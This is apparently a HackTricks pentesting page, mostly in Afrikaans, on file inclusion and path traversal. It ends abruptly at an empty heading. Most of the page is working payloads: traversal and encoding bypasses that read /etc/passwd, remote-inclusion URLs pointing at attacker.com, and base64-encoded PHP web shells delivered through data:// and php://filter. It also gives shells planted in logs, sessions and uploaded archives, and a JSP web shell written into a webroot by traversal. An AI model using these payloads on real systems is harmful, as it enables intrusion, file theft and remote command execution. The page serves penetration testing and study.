# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Die lêer word vanaf 'n remote server gelaai (Beste: Jy kan die code skryf en die server sal dit uitvoer). In php is dit standaard **uitgeskakel** (**allow_url_include**).\
**Local File Inclusion (LFI):** Die bediener laai 'n plaaslike lêer.

Die kwesbaarheid ontstaan wanneer die gebruiker op enigerlei wyse beheer oor die lêer het wat deur die bediener gelaai gaan word.

Kwetsbare **PHP functions**: require, require_once, include, include_once

'n interessante hulpmiddel om hierdie kwesbaarheid te benut: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Deur verskeie \*nix LFI-lyste te kombineer en meer paaie by te voeg het ek hierdie een geskep:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Probeer ook om `/` na `\` te verander\
Probeer ook om `../../../../../` by te voeg

'n Lys wat verskeie tegnieke gebruik om die lêer /etc/password te vind (om te kontroleer of die kwesbaarheid bestaan) kan gevind word [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Samevoeging van verskeie woordlyste:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Probeer ook om `/` na `\` te verander\
Probeer ook om `C:/` te verwyder en `../../../../../` by te voeg

'n Lys wat verskeie tegnieke gebruik om die lêer /boot.ini te vind (om te kontroleer of die kwesbaarheid bestaan) kan gevind word [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Kyk na die LFI-lys van linux.

## Basiese LFI and bypasses

Al die voorbeelde is vir Local File Inclusion maar kan ook op Remote File Inclusion toegepas word (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences nie-rekursief verwyder
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass die toevoeging van meer karakters aan die einde van die gegewe string (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Dit is **opgelos sedert PHP 5.4**

### **Enkodering**

Jy kan nie-standaard enkoderinge gebruik soos double URL encode (en ander):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Van bestaande folder

Miskien kontroleer die back-end die folder pad:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Verken lêerstelselgidse op 'n bediener

Die lêerstelsel van 'n bediener kan rekursief verken word om gidse, nie net lêers nie, te identifiseer deur sekere tegnieke toe te pas. Hierdie proses behels die bepaal van die gidsdiepte en die ondersoek na die bestaan van spesifieke vouers. Hieronder volg 'n gedetaileerde metode om dit te bereik:

1. **Bepaal gidsdiepte:** Bepaal die diepte van jou huidige gids deur suksesvol die `/etc/passwd` lêer te haal (van toepassing as die bediener op Linux gebaseer is). 'n Voorbeeld-URL kan soos volg gestruktureer wees, wat 'n diepte van drie aandui:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Speur na gidse:** Voeg die naam van die vermoedelike gids (bv. `private`) by die URL, en navigeer dan terug na `/etc/passwd`. Die ekstra gidsvlak vereis dat die depth met een verhoog word:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpreteer die uitslae:** Die bediener se reaksie dui aan of die gids bestaan:
- **Fout / Geen Uitset:** Die gids `private` bestaan waarskynlik nie by die gespesifiseerde ligging nie.
- **Inhoud van `/etc/passwd`:** Die bestaan van die `private` gids word bevestig.
4. **Rekursiewe verkenning:** Gevonde gidses kan verder ondersoek word vir subgidse of lêers deur dieselfde tegniek of tradisionele Local File Inclusion (LFI) metodes te gebruik.

Om gidse op verskillende plekke in die lêerstelsel te verken, pas die payload dienooreenkomstig aan. Byvoorbeeld, om te kontroleer of `/var/www/` 'n `private` gids bevat (aangesien die huidige gids op 'n diepte van 3 is), gebruik:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation is 'n metode wat gebruik word om lêerpaadjies in webtoepassings te manipuleer. Dit word dikwels gebruik om toegang tot beperkte lêers te kry deur sekere sekuriteitsmaatreëls te omseil wat ekstra karakters aan die einde van lêerpaadjies toevoeg. Die doel is om 'n lêerpad te skep wat, sodra dit deur die sekuriteitsmaatreël verander is, steeds na die gewenste lêer wys.

In PHP kan verskeie voorstellings van 'n lêerpad as ekwivalent beskou word weens die aard van die lêerstelsel. Byvoorbeeld:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` word almal as dieselfde pad behandel.
- Wanneer die laaste 6 karakters `passwd` is, verander die toevoeging van 'n `/` (waardeur dit `passwd/` word) nie die geteikende lêer nie.
- Net so, as `.php` aan 'n lêerpad aangeheg is (soos `shellcode.php`), sal die byvoeging van `/.` aan die einde nie die geraakte lêer verander nie.

Die voorbeelde hieronder demonstreer hoe om path truncation te gebruik om toegang tot `/etc/passwd` te kry, 'n algemene teiken weens die sensitiewe inhoud daarvan (inligting oor gebruikersrekeninge):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In hierdie scenario's kan die aantal traversals wat benodig word ongeveer 2027 wees, maar hierdie getal kan wissel op grond van die bediener se konfigurasie.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) gekombineer met addisionele dot segments en karakters kan gebruik word om deur die lêerstelsel te navigeer, en effektief aangehegte stringe deur die bediener te ignoreer.
- **Determining the Required Number of Traversals**: Deur proef-en-fout kan 'n mens die presiese aantal `../` reekse vind wat nodig is om na die wortelgids en dan na `/etc/passwd` te navigeer, en seker te maak dat enige aangehegte stringe (soos `.php`) geneutraliseer word terwyl die gewenste pad (`/etc/passwd`) ongeskonde bly.
- **Starting with a Fake Directory**: Dit is algemene praktyk om die pad te begin met 'n nie-bestaande gids (soos `a/`). Hierdie tegniek word gebruik as 'n voorsorgmaatreël of om te voldoen aan die vereistes van die bediener se padparsingslogika.

Wanneer path truncation techniques toegepas word, is dit noodsaaklik om die bediener se padparsingsgedrag en lêerstelselstruktuur te verstaan. Elke scenario kan 'n ander benadering vereis, en toetsing is dikwels nodig om die doeltreffendste metode te vind.

**Hierdie kwesbaarheid is reggestel in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

In php is dit standaard gedeaktiveer omdat **`allow_url_include`** op **Off** is. Dit moet op **On** wees om te werk, en in daardie geval kan jy 'n PHP-lêer vanaf jou bediener insluit en RCE kry:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Indien om een of ander rede **`allow_url_include`** **On** is, maar PHP toegang tot eksterne webblaaie **filtreer**, [volgens hierdie pos](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), kan jy byvoorbeeld die data-protokol met base64 gebruik om 'n b64 PHP-kode te dekodeer en RCE te kry:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> In die vorige kode is die finale `+.txt` bygevoeg omdat die attacker 'n string nodig gehad het wat op `.txt` eindig, sodat die string daarmee eindig en na die b64 decode sal daardie deel net gemors teruggee en die werklike PHP-kode ingesluit (en gevolglik uitgevoer) word.

Nog 'n voorbeeld **wat nie die `php://` protocol gebruik nie** sou wees:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Wortelelement

In Python, in 'n kode soos hierdie:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
As die gebruiker 'n **absolute path** na **`file_name`** deurgee, word die **vorige pad net verwyder**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Dit is die bedoelde gedrag volgens [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> As 'n komponent 'n absolute pad is, word alle vorige komponente weggegooi en samevoeging gaan voort vanaf die absolute padkomponent.

## Java: Lys van gidse

Dit lyk asof as jy 'n Path Traversal in Java het en jy **vir 'n gids vra** in plaas van 'n lêer, 'n **lys van die gids teruggestuur word**. Dit sal nie in ander tale gebeur nie (sover ek weet).

## Top 25 parameters

Hier is 'n lys van die top 25 parameters wat kwesbaar kan wees vir local file inclusion (LFI)-kwesbaarhede (van [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI gebruik PHP wrappers & protokolle

### php://filter

PHP filters laat toe om basiese **wysigingsoperasies op die data** uit te voer voordat dit gelees of geskryf word. Daar is 5 kategorieë filters:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Verwyder tags uit die data (alles tussen die "<" en ">" karakters)
- Nota dat hierdie filter uit moderne weergawes van PHP verdwyn het
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Skakel na 'n ander enkodering (`convert.iconv.<input_enc>.<output_enc>`). Om die **lys van alle enkodings** wat ondersteun word te kry, hardloop in die konsole: `iconv -l`

> [!WARNING]
> Deur misbruik te maak van die `convert.iconv.*` omskakelingsfilter kan jy **willekeurige teks genereer**, wat nuttig kan wees om willekeurige teks te skryf of om 'n funksie soos include te laat verwerk wat willekeurige teks hanteer. Vir meer inligting sien [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Komprimeer die inhoud (nuttig as jy baie inligting wil eksfiltreer)
- `zlib.inflate`: De-komprimeer die data
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Verouderd
- `mdecrypt.*` : Verouderd
- Ander Filters
- As jy in PHP `var_dump(stream_get_filters());` hardloop kan jy 'n paar **onverwagte filters** vind:
- `consumed`
- `dechunk`: keer HTTP chunked enkodering om
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Die deel "php://filter" is hoofdletterongevoelig

### Gebruik php filters as oracle om arbitrêre lêers te lees

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) is 'n tegniek voorgestel om 'n plaaslike lêer te lees sonder dat die uitvoer deur die bediener teruggegee word. Hierdie tegniek is gebaseer op 'n **boolean exfiltration of the file (char by char) using php filters** as oracle. Dit is omdat php filters gebruik kan word om 'n teks groot genoeg te maak sodat php 'n uitsondering sal gooi.

In die oorspronklike pos vind jy 'n gedetailleerde verduideliking van die tegniek, maar hier is 'n vinnige opsomming:

- Gebruik die codec **`UCS-4LE`** om die voorste karakter van die teks aan die begin te laat en sodoende die grootte van die string eksponensieel te laat toeneem.
- Dit sal gebruik word om 'n **teks te genereer wat so groot is wanneer die aanvanklike letter korrek geraden word** dat php 'n **fout** sal veroorsaak.
- Die **dechunk** filter sal **alles verwyder as die eerste karakter nie 'n hexadecimal is nie**, sodat ons kan weet of die eerste karakter hex is.
- Dit, gekombineer met die vorige een (en ander filters afhangend van die geraadde letter), maak dit moontlik om 'n letter aan die begin van die teks te raai deur te kyk wanneer ons genoeg transformasies doen om dit nie meer 'n hexadecimal karakter te laat wees nie. As dit hex is, sal dechunk dit nie verwyder nie en die aanvanklike bom sal php laat fout.
- Die codec **convert.iconv.UNICODE.CP930** transformeer elke letter na die volgende een (so na hierdie codec: a -> b). Dit laat ons toe om byvoorbeeld te ontdek of die eerste letter 'n `a` is omdat as ons hierdie codec 6 keer toepas a->b->c->d->e->f->g die letter nie meer 'n hexadecimal karakter is nie, dus verwyder dechunk dit nie en die php-fout word geaktiveer omdat dit met die aanvanklike bom vermenigvuldig.
- Deur ander transformasies aan die begin te gebruik, soos **rot13**, is dit moontlik om ander karakters te leak soos n, o, p, q, r (en ander codecs kan gebruik word om ander letters na die hex-reeks te skuif).
- Wanneer die aanvanklike karakter 'n getal is, moet dit base64 gekodeer word en moet jy die eerste 2 letters leak om die getal te ontsluit.
- Die finale probleem is om te sien **hoe om meer as die aanvanklike letter te leak**. Deur order memory filters te gebruik soos **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** is dit moontlik om die volgorde van die karakters te verander en ander letters van die teks in die eerste posisie te kry.
- En om verder data te kan bekom, is die idee om **2 bytes rommeldata aan die begin te genereer** met **convert.iconv.UTF16.UTF16**, **UCS-4LE** toe te pas om dit **met die volgende 2 bytes te pivot**, en **verwyder die data tot by die rommeldata** (dit sal die eerste 2 bytes van die aanvanklike teks verwyder). Gaan voort om dit te doen totdat jy die gewenste deel bereik om te leak.

In die pos is 'n hulpmiddel om dit outomaties uit te voer ook leaked: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Hierdie wrapper maak dit moontlik om toegang tot file descriptors te kry wat die proses oop het. Potensieel nuttig om die inhoud van oop lêers te exfiltrate:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Jy kan ook **php://stdin, php://stdout en php://stderr** gebruik om toegang te kry tot die **file descriptors 0, 1 en 2** onderskeidelik (nie seker hoe dit in 'n aanval nuttig kan wees nie)

### zip:// en rar://

Laai 'n Zip- of Rar-lêer op met 'n PHPShell binne en kry toegang daartoe.\
Om die rar protocol te kan misbruik moet dit **spesifiek geaktiveer** wees.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Let wel dat hierdie protokol beperk word deur die php-konfigurasies **`allow_url_open`** en **`allow_url_include`**

### expect://

Expect moet geaktiveer wees. Jy kan kode hiermee uitvoer:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Spesifiseer jou payload in die POST-parameters:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

'n `.phar`-lêer kan gebruik word om PHP-kode uit te voer wanneer 'n webtoepassing funksies soos `include` vir lêerlaai gebruik. Die PHP-codefragment hieronder demonstreer die skep van 'n `.phar`-lêer:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Om die `.phar`-lêer te kompileer, moet die volgende opdrag uitgevoer word:
```bash
php --define phar.readonly=0 create_path.php
```
By uitvoering sal 'n lêer met die naam `test.phar` geskep word, wat moontlik misbruik kan word om Local File Inclusion (LFI) kwesbaarhede te eksploiteer.

In gevalle waar die LFI slegs lêers lees sonder om die PHP-kode daarin uit te voer, via funksies soos `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, of `filesize()`, kan daar 'n poging aangewend word om 'n deserialization-kwesbaarheid te exploiteer. Hierdie kwesbaarheid is geassosieer met die lees van lêers met die `phar` protocol.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Very quick summary: a **3 byte overflow** in the PHP heap was abused to **alter the chain of free chunks** of anspecific size in order to be able to **write anything in any address**, so a hook was added to call **`system`**.\
It was possible to alloc chunks of specific sizes abusing more php filters.

### More protocols

Kyk na meer moontlike[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Skryf in geheue of in 'n tydelike lêer (nie seker hoe dit nuttig kan wees in 'n file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Accessing local filesystem
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Accessing HTTP(s) URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Accessing FTP(s) URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Find pathnames matching pattern (It doesn't return nothing printable, so not really useful here)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Not useful to read arbitrary files)

## LFI via PHP's 'assert'

Local File Inclusion (LFI)-risiko's in PHP is besonder hoog wanneer die 'assert' funksie betrokke is, wat kode binne strings kan uitvoer. Dit is veral problematies as insette wat directory traversal-karakters soos ".." bevat, ondersoek word maar nie behoorlik gesanitiseer is nie.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Alhoewel dit bedoel is om traversal te stop, skep dit per ongeluk 'n vektor vir code injection. Om dit te misbruik om file contents te lees, kan 'n attacker gebruik:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Net so, om ewekansige stelselopdragte uit te voer, kan 'n mens gebruik:
```plaintext
' and die(system("id")) or '
```
Dit is belangrik om hierdie payloads te **URL-encode**.

## PHP Blind Path Traversal

> [!WARNING]
> Hierdie tegniek is relevant in gevalle waar jy die **file path** van 'n **PHP function** beheer wat 'n **file** sal **access**, maar jy sal nie die inhoud van die file sien nie (soos 'n eenvoudige oproep na **`file()`**) en die inhoud word nie getoon nie.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) word verduidelik hoe 'n blind path traversal via PHP filter misbruik kan word om die inhoud van 'n file via 'n error oracle te exfiltrate.

Kortliks, gebruik die tegniek die **"UCS-4LE" encoding** om die inhoud van 'n file so **big** te maak dat die **PHP function opening** die file 'n **error** sal veroorsaak.

Dan, om die eerste char te leak, word die filter **`dechunk`** gebruik tesame met ander soos **base64** of **rot13** en uiteindelik word die filters **convert.iconv.UCS-4.UCS-4LE** en **convert.iconv.UTF16.UTF-16BE** gebruik om **ander chars aan die begin te plaas en hulle te leak**.

**Funksies wat moontlik kwesbaar is**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Vir die tegniese besonderhede, kyk na die genoemde post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Wanneer server-side code wat files ingesit/oppgelaai (ingests/uploads) bou die bestemmingpad met gebruiker-gekontrolleerde data (bv. 'n filename of URL) sonder om dit te canonicaliseer en te valideer, kan `..` segments en absolute paths die beoogde directory verlaat en 'n arbitrary file write veroorsaak. As jy die payload onder 'n web-exposed directory kan plaas, kry jy gewoonlik unauthenticated RCE deur 'n webshell neer te sit.

Tipiese exploit-werkvloei:
- Identifiseer 'n write primitive in 'n endpoint of background worker wat 'n path/filename aanvaar en inhoud na skyf skryf (bv. message-driven ingestion, XML/JSON command handlers, ZIP extractors, ens.).
- Bepaal web-exposed directories. Algemene voorbeelde:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Skep 'n traversal path wat uit die beoogde storage directory breek in die webroot, en sluit jou webshell-inhoud in.
- Blaai na die gedropte payload en voer opdragte uit.

Notes:
- Die kwesbare diens wat die write uitvoer, mag na 'n non-HTTP port luister (bv. 'n JMF XML listener op TCP 4004). Die hoof web portaal (ander port) sal later jou payload bedien.
- Op Java stacks word hierdie file writes dikwels geïmplementeer met eenvoudige `File`/`Paths` concatenation. Gebrek aan canonicalisation/allow-listing is die kernfout.

Generiese XML/JMF-styl voorbeeld (produk schemas verskil – die DOCTYPE/body wrapper is irrelevant vir die traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Hardening wat hierdie klas foute teëwerk:
- Los op na ’n kanonieke pad en dwing af dat dit ’n nakomeling is van ’n allow-listed base directory.
- Verwerp enige pad wat `..`, absolute roots, of stasieletters bevat; verkies gegenereerde filenames.
- Voer die writer as ’n laagprivilegieerde rekening uit en skei write directories van served roots.

## Remote File Inclusion

Explained previously, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

> [!WARNING]
> Let wel dat **as jy double quotes gebruik** vir die shell in plaas van **single quotes**, sal die double quotes verander word na die string "_**quote;**_", **PHP sal ’n fout gooi** en **niks anders sal uitgevoer word nie**.
>
> Maak ook seker dat jy die payload **korrek skryf**, anders sal PHP elke keer fout gee wanneer dit probeer die log file laai en sal jy nie ’n tweede kans hê nie.

This could also be done in other logs but **be careful,** the code inside the logs could be URL encoded and this could destroy the Shell. The header **authorisation "basic"** contains "user:password" in Base64 and it is decoded inside the logs. The PHPShell could be inserted inside this header.\
Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via Email

**Stuur 'n e-pos** na 'n interne rekening (user@localhost) wat jou PHP payload bevat soos `<?php echo system($_REQUEST["cmd"]); ?>` en probeer om die e-pos van die gebruiker in te sluit met 'n pad soos **`/var/mail/<USERNAME>`** of **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. Laai baie shells op (byvoorbeeld: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), met $PID = PID van die proses (kan brute forced word) en $FD = file descriptor (kan ook brute forced word)

### Via /proc/self/environ

Soos 'n loglêer, stuur die payload in die User-Agent; dit sal in die /proc/self/environ-lêer gereflekteer word.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Deur upload

As jy 'n file kan upload, injekteer net die shell payload daarin (bv: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Om die lêer leesbaar te hou is dit die beste om dit in die metadata van die prente/doc/pdf in te voeg

### Via ZIP-lêer oplaai

Laai 'n ZIP-lêer op wat 'n gekompresseerde PHP shell bevat en toegang daartoe:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Deur PHP-sessies

Kontroleer of die webwerf PHP-sessies gebruik (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP word hierdie sessies gestoor in _/var/lib/php5/sess\\_\[PHPSESSID]\_ lêers
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Stel die cookie op `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Gebruik die LFI om die PHP-sessie-lêer in te sluit.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Deur ssh

As ssh aktief is, kyk watter gebruiker gebruik word (/proc/self/status & /etc/passwd) en probeer toegang kry tot **\<HOME>/.ssh/id_rsa**

### **Deur** **vsftpd** _**loglêers**_

Die loglêers van die FTP-bediener vsftpd is geleë by _**/var/log/vsftpd.log**_. In die scenario waar 'n Local File Inclusion (LFI) kwesbaarheid bestaan en toegang tot 'n blootgestelde vsftpd-bediener moontlik is, kan die volgende stappe oorweeg word:

1. Inspuit 'n PHP payload in die gebruikersnaamveld tydens die aanmeldproses.
2. Na inspuiting, gebruik die LFI om die bedienerloglêers vanaf _**/var/log/vsftpd.log**_ op te haal.

### Deur php base64 filter (using base64)

Soos getoon in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) artikel, sal die PHP base64 filter net Non-base64 karakters ignoreer. Jy kan dit gebruik om die lêeruitbreidingkontrole te omseil: as jy base64 verskaf wat eindig met ".php", sal dit die "." ignoreer en "php" aan die base64 heg. Hier is 'n voorbeeld payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (geen lêer nodig nie)

